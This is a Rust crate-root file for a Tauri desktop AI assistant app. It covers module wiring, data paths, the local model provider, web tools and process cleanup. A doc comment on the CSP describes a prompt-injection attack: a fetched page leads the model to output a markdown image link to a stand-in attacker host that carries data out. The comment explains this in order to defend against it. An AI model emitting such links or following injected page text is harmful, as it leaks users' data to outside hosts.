// ── surface: backend ──────────────────────────────────
// Crate root — module wiring + Tauri setup (incl. the CSP rationale: why img-src is spelled out).
// Exports: run · Related: main.rs, commands.rs

mod agent;
mod actions;
mod approvals;
mod capture;
mod coderun;
mod commands;
mod docgen;
mod documents;
mod grounding;
mod keystore;
mod permissions;
mod processes;
mod provider;
mod sandbox;
mod snapshots;
mod store;
mod tools;
mod tscn;

use std::path::PathBuf;
use std::sync::{Arc, Mutex};

use approvals::Approvals;
use coderun::CodeRuns;
use commands::AppState;
use grounding::resolve_timezone;
use provider::lmstudio::LmStudioProvider;
use provider::Provider;
use store::Store;
use tauri::Manager;
use tools::fetch::{FetchProvider, TavilyExtract};
use tools::search::{SearchProvider, TavilySearch};
use tools::Tools;

/// **On the CSP in `tauri.conf.json`.** A full `default-src 'self'` policy, not the
/// img-src-only one this comment described before 2026-10-06 — so the old reasoning
/// that "unset directives stay unrestricted" no longer applies, and the config, not
/// this comment, is the source of truth.
///
/// `img-src` is still spelled out explicitly, and that is the reason a CSP is here at
/// all: an `<img>` issues its GET on render, so a prompt injected into a page
/// returned by `web_fetch` can make the model emit `![](https://attacker/p.png?d=…)`
/// and the request leaves as the token streams. The `img` override in `App.tsx` is
/// the primary defence; this is the backstop for anything that bypasses it.
///
/// It is NOT a tight policy: `script-src` and `style-src` both allow `'unsafe-inline'`
/// — the latter is load-bearing (KaTeX emits inline styles, and every React
/// `style={{…}}` prop becomes a style attribute) — and `connect-src` opens
/// `ws://localhost:1420` for the dev server. Each of those is a real loosening —
/// verify it against a running build before narrowing it. Tauri's IPC needs
/// `ipc:`/`http://ipc.localhost` in `connect-src`, and a wrong policy white-screens
/// the app on launch, which is not a thing to discover after shipping.
#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    // Load src-tauri/.env (e.g. TAVILY_API_KEY, OUTPOST_TIMEZONE) for local
    // dev. A missing file is fine — tools that need a key report it at call time.
    //
    // `from_path` on THIS crate's dir, not `dotenv()`, which walks every ancestor
    // until it finds a .env. The vars it can set relocate the permission store
    // and the notes root, so picking up a stray file from a parent folder would
    // silently repoint security-relevant state. In an installed build the path
    // doesn't exist and this is a no-op, which is the intent — it's a dev
    // convenience, not a configuration mechanism.
    let _ = dotenvy::from_path(
        std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(".env"),
    );

    tauri::Builder::default()
        .plugin(tauri_plugin_single_instance::init(|app, _args, _cwd| {
            if let Some(w) = app.get_webview_window("main") {
                let _ = w.show();
                let _ = w.unminimize();
                let _ = w.set_focus();
            }
        }))
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_updater::Builder::new().build())
        .setup(|app| {
            // All persistent data lives in the OS per-user data dir (writable, keyed
            // by the bundle identifier) — `%APPDATA%\<id>` on Windows. Same path in
            // dev and in an installed build, so a distributed Outpost writes to the
            // *user's* AppData rather than a location baked into the build machine, and
            // the files sit outside the project so the dev file-watcher ignores their
            // writes. Per-store env vars still override (OUTPOST_DB_PATH etc.).
            let data_dir = app.path().app_data_dir()?;
            std::fs::create_dir_all(&data_dir)?;

            let db_path = env_or("OUTPOST_DB_PATH", data_dir.join("outpost.db"));
            let permissions_path =
                env_or("OUTPOST_PERMISSIONS_PATH", data_dir.join("permissions.json"));
            let notes_root = env_or("OUTPOST_NOTES_DIR", data_dir.join("notes"));
            let models_root = env_or("FASTEMBED_CACHE_DIR", data_dir.join("models"));
            let _ = std::fs::create_dir_all(&models_root);
            std::env::set_var("FASTEMBED_CACHE_DIR", &models_root);

            // One-time migration of an existing dev install's data into the app-data
            // dir. No-op on a fresh machine (the old compile-time paths don't exist).
            migrate_file(&dev_db_path(), &db_path);
            migrate_file(&legacy_root_path("permissions.json"), &permissions_path);
            migrate_dev_models(&models_root);

            let _ = std::fs::create_dir_all(&notes_root);
            let actions_root = data_dir.join("actions");
            actions::seed_default_actions(&actions_root);

            // Single active provider for now: LM Studio's OpenAI-compatible local server.
            let provider: Arc<dyn Provider> =
                Arc::new(LmStudioProvider::new("http://localhost:1234/v1", None));
            // Search/extract read the Tavily key per-call from the OS keychain (set
            // in-app via Settings → Web search), falling back to TAVILY_API_KEY.
            let search: Arc<dyn SearchProvider> = Arc::new(TavilySearch::new());
            let fetch: Arc<dyn FetchProvider> = Arc::new(TavilyExtract::new());

            let approvals = Arc::new(Approvals::new());
            let code_runs = Arc::new(CodeRuns::new());
            let permissions = Arc::new(permissions::PermissionStore::open(permissions_path));
            let snapshots = Arc::new(snapshots::Snapshots::open(data_dir.join("snapshots")));
            let processes = Arc::new(processes::Processes::new(Some(app.handle().clone())));
            let p_clone = processes.clone();
            tauri::async_runtime::spawn(async move {
                p_clone.monitor_crashes().await;
            });
            let tools = Arc::new(Tools::new(
                search,
                fetch,
                notes_root,
                approvals.clone(),
                code_runs.clone(),
                permissions.clone(),
                snapshots.clone(),
                processes.clone(),
                app.handle().clone(),
            ));
            let store = Arc::new(Store::open(&db_path).expect("failed to open database"));
            let tz = resolve_timezone();

            app.manage(AppState {
                provider,
                tools,
                approvals,
                code_runs,
                permissions,
                snapshots,
                processes,
                store,
                tz,
                cancel: Mutex::new(None),
                index_cancel: Mutex::new(None),
            });
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            commands::list_models,
            commands::send_chat,
            commands::list_project_docs,
            commands::read_project_doc,
            commands::write_project_doc,
            commands::check_directory_exists,
            commands::check_directories_exist,
            commands::list_project_files,
            commands::read_project_file,
            commands::get_session_modified_files,
            commands::get_file_diff,
            commands::warm_search_index,
            commands::start_repo_indexing,
            commands::stop_repo_indexing,
            commands::get_permissions,
            commands::set_permissions,
            commands::stop_turn,
            commands::stop_managed_process,
            commands::current_datetime,
            commands::resolve_edit,
            commands::resolve_code,
            commands::set_api_key,
            commands::has_api_key,
            commands::delete_api_key,
            commands::list_threads,
            commands::create_thread,
            commands::load_thread,
            commands::save_thread,
            commands::duplicate_thread,
            commands::delete_thread,
            commands::rename_thread,
            commands::list_trashed,
            commands::restore_thread,
            commands::purge_thread,
            commands::purge_trashed,
            commands::preview_context,
            commands::compact_thread,
            commands::export_markdown,
            documents::extract_document,
            docgen::export_docx,
            commands::list_notes,
            commands::list_pages,
            commands::open_page,
            commands::read_note,
            commands::delete_note,
            commands::reveal_note,
            commands::reveal_folder,
            commands::rename_note,
            commands::load_thread_config,
            commands::save_thread_config,
            actions::list_actions,
            actions::reveal_actions_dir,
            commands::get_embedding_model_status,
            commands::download_embedding_model,
            commands::delete_embedding_model,
            commands::reveal_models_dir,
            commands::save_file
        ])
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|app_handle, event| match event {
            // Take the managed processes down with the app. They're deliberately
            // spawned detached (a dev server must outlive the tool call), and on
            // Windows nothing reaps them on exit — so without this, quitting leaves
            // an orphaned server squatting on its port until Task Manager.
            tauri::RunEvent::WindowEvent {
                label,
                event: tauri::WindowEvent::Destroyed,
                ..
            } if label == "main" => {
                use tauri::Manager;
                if let Some(w) = app_handle.get_webview_window("perception") {
                    let _ = w.destroy();
                }
                let state = app_handle.state::<AppState>();
                state.processes.stop_all();
                app_handle.exit(0);
            }
            tauri::RunEvent::Exit => {
                use tauri::Manager;
                let state = app_handle.state::<AppState>();
                state.processes.stop_all();
            }
            _ => {}
        });
}

/// A per-store env-var override → PathBuf, else the given default (the app-data
/// path). Keeps OUTPOST_DB_PATH / … working for power users.
fn env_or(key: &str, default: PathBuf) -> PathBuf {
    // An EMPTY override is not an override. `OUTPOST_DB_PATH=` — set but blank,
    // trivially easy in a .env — otherwise became `Path::new("")`, and
    // `sqlite3_open("")` opens a PRIVATE TEMPORARY database that SQLite deletes
    // when the process exits: every chat in that session would vanish on quit,
    // with no error anywhere. `grounding.rs` and `keystore.rs` already filter
    // empties; this was the odd one out.
    std::env::var(key)
        .ok()
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
        .map(PathBuf::from)
        .unwrap_or(default)
}

/// Copy `old` → `new` once, only if `new` doesn't exist yet and `old` does —
/// migrates an existing dev install's data into the app-data dir. A no-op on a
/// fresh machine, where the old compile-time path doesn't exist.
fn migrate_file(old: &std::path::Path, new: &std::path::Path) {
    if new.exists() || !old.exists() {
        return;
    }
    if let Some(parent) = new.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::copy(old, new);
}

/// Pre-relocation DB path beside the crate (build machine dev box).
fn dev_db_path() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("outpost.db")
}

/// Pre-relocation path for a JSON store: `<file>` at the project root (build
/// machine only).
fn legacy_root_path(file: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|p| p.parent())
        .map(|root| root.join(file))
        .unwrap_or_else(|| PathBuf::from(file))
}

/// One-time migration of existing dev build fastembed cache into app_data/models.
fn migrate_dev_models(models_root: &std::path::Path) {
    let target = models_root.join("models--Xenova--bge-small-en-v1.5");
    if target.exists() {
        return;
    }
    let dev_cache = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join(".fastembed_cache")
        .join("models--Xenova--bge-small-en-v1.5");
    if dev_cache.exists() {
        let _ = copy_dir_all(&dev_cache, &target);
    }
}

/// Recursively copy all files and directories from src to dst.
fn copy_dir_all(src: &std::path::Path, dst: &std::path::Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let ty = entry.file_type()?;
        let target = dst.join(entry.file_name());
        if ty.is_dir() {
            copy_dir_all(&entry.path(), &target)?;
        } else if !target.exists() {
            let _ = std::fs::copy(entry.path(), target);
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_env_or_filters_empty() {
        let p = env_or("NONEXISTENT_VAR_XYZ_123", PathBuf::from("default.db"));
        assert_eq!(p, PathBuf::from("default.db"));
    }
}
